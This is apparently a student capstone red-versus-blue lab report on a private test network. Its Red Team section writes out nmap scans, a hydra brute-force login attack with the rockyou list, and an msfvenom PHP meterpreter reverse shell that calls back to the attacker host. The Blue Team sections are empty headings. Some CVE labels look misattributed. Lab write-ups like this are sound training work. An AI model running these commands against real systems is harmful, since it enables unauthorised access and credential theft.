## Capstone Red vs Blue CySec Report

Author: Min Young Lee

## Preface
This is a cybersecurity project report on a network vulnerability.  There are two parts of this project: the attacker (Red Team) and the victim (Blue Team).  The Red Team is tasked with identifying vulnerabilities in the network and exploiting the found vulnerabilities.  The Blue Team is tasked with detecting malicious activities on the network and mitigating the identified malicious attacks.  

## Network Topology

![](img url)

| Hostname| IP Address | Role on Network |
| ------------------ | ------------------ |------------------ |
|ML-RefVM-684427| 192.168.1.1 | NATSwitch|
|Capstone |192.168.1.105 |Web server|
|Kali |192.168.1.90 |Pen. test system|
|ELK |192.168.1.100| SIEM system|

# Red Team
## Recon
## Vulnerability Assessment 

|Vulnerability| Description| Impact|
| ------------------ | -------- |------------------ |
|Apache Directory Listing CVE-2007-0450|Allows browser traversal to realdirectories on Capstone Apacheweb server|Allowed attackers to reveal the ip address and the secret folder|
|No Failed Login Lockout| No account lockdown when excessive login failures occurred within a short period of time| Brute force attack was possible to gain access to Ryan’s login information |
|Weak Password| The password was available on a common password library such as “rockyou”| The brute force attack was able to identify the login password.|
|Reverse Shell Backdoor CVE-2019-13386| Allows to send a reverse shell payload on a web server while the firewalls do not detect the payload |Attackers gained the remote backdoor access to the Capstone web server|
|Weak Hashed Password |Unsalted hashed information which can be decrypted using various web applications to decode |The hashed information, the CEO login information, was decoded.  |
|Simplistic Username| Usage of the common names or real names as a login ID |By having an access to the directory, the attack was able to identify the login IDs |
|Root Accessibility| The anonymous commands has an access to the resources |The attacker was able to connect to devices|
|Unencrypted Credentials |The stored values of usernames and passwords, both passwords and the hashed passwords, were in a plain text |The attacker was able to gain access to the login IDs and passwords|

## Exploitation(s) 
### Apache Directory Listing CVE-2007-0450
	netdiscover -r 192.168.1.255/16

	nmap -sV 192.168.1.1-105

	nmap -sS -A 192.168.1.105

	wget 192.168.1.105 /meet_our_team/ashton.txt

### No Failed Login Lockout
	hydra -l ashton -P /usr/share/wordlists/rockyou .txt -s 80 -f -vV 192.168.1.105 http-get/company_folders/secret_folder/ -t 60

### Reverse Shell Backdoor CVE-2019-13386
	msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php

Login to webdav as Ryan to move the payload
Listen to host: 192.168.1.90 & port:4444

	meterpreter> shell
	>find / -name flag.txt 2>/dev/null
	>cat flag.txt

# Blue Team
## Vulnerability Analysis 
## Hardening
# Assessment Summary 
